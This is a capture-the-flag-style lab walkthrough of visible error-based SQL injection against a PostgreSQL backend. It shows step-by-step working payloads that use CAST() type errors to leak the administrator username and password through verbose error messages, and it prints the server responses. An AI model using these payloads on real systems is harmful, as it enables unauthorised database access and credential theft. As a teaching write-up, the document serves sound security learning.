# Visible Error-Based SQL Injection — Walkthrough

## Introduction

Error-based SQL injection is a technique where the application doesn't hide database errors from the user — it prints them straight to the screen. That's the "visible" part. Unlike **blind** error-based injection (where you only get a true/false signal, like an HTTP 500 vs 200), here the database error message itself contains the data we're trying to steal. That means no binary search, no automation script needed — the database basically reads the data out loud to us.

This walkthrough documents solving a lab where the backend is **PostgreSQL**, using type-casting (`CAST()`) to force the database to leak column values inside its own error messages.

## How It Works

The core trick is abusing PostgreSQL's type-casting function:

```sql
CAST(value AS type)
```

`CAST()` converts a value from one data type to another — e.g., text to integer. If the value can't actually be converted (like the string `"administrator"` cast to `int`), Postgres throws an error, and critically, **that error message includes the exact value it failed to convert.** That's our data exfiltration channel.

## Step-by-Step Walkthrough

### 1. Confirm the injection point

Add a single quote to the end of the `tracking id` parameter:

```
o1N0d6pHKVanNIAM'
```

Server response:

```
Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = 'o1N0d6pHKVanNIAM''. Expected  char
```

The response leaks the raw query being run:

```sql
SELECT * FROM tracking WHERE id = 'o1N0d6pHKVanNIAM'
```

Our extra `'` broke the string, confirming the parameter is concatenated directly into the query — no sanitization. Classic injection point.

### 2. Comment out the rest of the query

Using `--` to comment out whatever comes after our injected quote lets the query run cleanly again:

```
o1N0d6pHKVanNIAM'--
```

Result: `200 OK`, no error. This confirms we can control the query structure from here.

### 3. Trigger a type-cast error with CAST()

```sql
' AND CAST((SELECT 1) AS int)--
```

Result:

```
ERROR: argument of AND must be type boolean, not type integer
Position: 47
```

**Why this happens:** the injected `WHERE` clause becomes:

```sql
WHERE id = '...' AND CAST((SELECT 1) AS int)
```

`AND` is a *logical* operator — both sides of it must evaluate to `true`/`false` (boolean). But `CAST((SELECT 1) AS int)` evaluates to the *integer* `1`, not a boolean. Postgres refuses to treat a plain integer as a boolean, so it throws a type error before it ever gets to running our subquery. It's not about *converting* the value wrong — it's that `AND` structurally requires a boolean on both sides, and we gave it a number.

### 4. Fix the boolean mismatch

Wrap the cast in an equality check so the right-hand side of `AND` becomes a true/false comparison instead of a raw integer:

```sql
' AND 1=CAST((SELECT 1) AS int)--
```

Now the clause reads `AND 1 = 1`, which *is* a boolean expression. Result: `200 OK`. The payload is now structurally valid — we've got a working injection template.

### 5. Attempt to extract the username

```sql
' AND 1=CAST((SELECT username from users) AS int)--
```

Result:

```
Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = 'o1N0d6pHKVanNIAM' AND 1=CAST((SELECT username from users) AS'. Expected  char
```

Note the query gets cut off mid-payload (`...AS'`). This pointed to a **length restriction** on the injectable parameter — the full payload wasn't reaching the database intact, so it broke the SQL syntax before it could even run.

### 6. Work around the length limit

Removing the tracking ID value (shortening the overall payload so it fits) let the full injected query actually execute. This surfaced the *real* underlying issue:

```
ERROR: more than one row returned by a subquery used as an expression
```

This is a separate, legitimate SQL error: `CAST((SELECT username FROM users) AS int)` expects the subquery to return exactly **one** value, but the `users` table has multiple rows, so `SELECT username FROM users` returns many. Postgres won't silently pick one — it just errors out.

### 7. Limit the subquery to one row

```sql
' AND 1=CAST((SELECT username from users LIMIT 1) AS int)--
```

Result:

```
ERROR: invalid input syntax for type integer: "administrator"
```

There it is — the username, sitting right in the error message. Postgres tried to cast `"administrator"` to an integer, failed, and told us exactly what it tried to cast.

### 8. Extract the password the same way

```sql
' AND 1=CAST((SELECT password from users LIMIT 1) AS int)--
```

Result:

```
ERROR: invalid input syntax for type integer: "9xnod94148yewm17coes"
```

Username and password both recovered directly from database error output. Lab solved.

## Key Takeaways

- **`AND` needs booleans on both sides** — a bare `CAST(... AS int)` will always fail against `AND` unless wrapped in a comparison (`1=CAST(...)`).
- **Error messages can be a full data exfiltration channel** on misconfigured PostgreSQL apps — no blind/binary-search automation required if verbose errors are enabled.
- **Payload length limits matter** — if a query gets truncated, you'll see a syntax error that looks unrelated to your actual logic bug. Don't assume the first error you see is the real one; shorten your payload and re-test before chasing the wrong root cause.
- **`LIMIT 1`** is essential when casting a subquery that could return multiple rows — otherwise Postgres throws a row-count error instead of the type error you actually want.
